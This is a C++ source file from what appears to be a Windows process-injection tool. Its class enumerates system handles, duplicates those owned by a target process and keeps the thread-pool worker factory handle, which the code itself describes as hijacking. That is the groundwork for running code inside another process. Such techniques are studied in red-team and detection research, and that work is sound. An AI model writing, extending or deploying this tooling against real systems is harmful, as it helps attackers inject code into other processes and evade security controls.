#include "Duplicator.hpp"

WorkerFactoryHandleDuplicator::WorkerFactoryHandleDuplicator(DWORD dwTargetPid, HANDLE hTarget) 
	: dwTargetPid(dwTargetPid), hTargetPid(hTarget) {}


// TODO: Make this more generic and support not only TpWorkerFactory duplication
HANDLE WorkerFactoryHandleDuplicator::Duplicate(DWORD dwDesiredPermissions) {

    auto pSystemInformation = w_NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)16);
    auto pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)pSystemInformation.data();

    HANDLE hDuplicatedObject;
    std::vector<BYTE> pObjectInformation;
    PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation;

    for (auto i = 0; i < pSystemHandleInformation->NumberOfHandles; i++)
    {
        try {
            if (pSystemHandleInformation->Handles[i].UniqueProcessId != this->dwTargetPid)
            {
                continue;
            }

            hDuplicatedObject = w_DuplicateHandle(this->hTargetPid, (HANDLE)pSystemHandleInformation->Handles[i].HandleValue, GetCurrentProcess(), dwDesiredPermissions, FALSE, NULL);


            pObjectInformation = w_NtQueryObject(hDuplicatedObject, ObjectTypeInformation);
            pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

            if (std::wstring(L"TpWorkerFactory") != std::wstring(pObjectTypeInformation->TypeName.Buffer)) {
                continue;
            }

            return hDuplicatedObject;
        } 
        catch (WindowsException)
        {
            continue;
        }

    }

    throw std::runtime_error("Failed to hijack worker factory handle");
}

WorkerFactoryHandleDuplicator::~WorkerFactoryHandleDuplicator(){}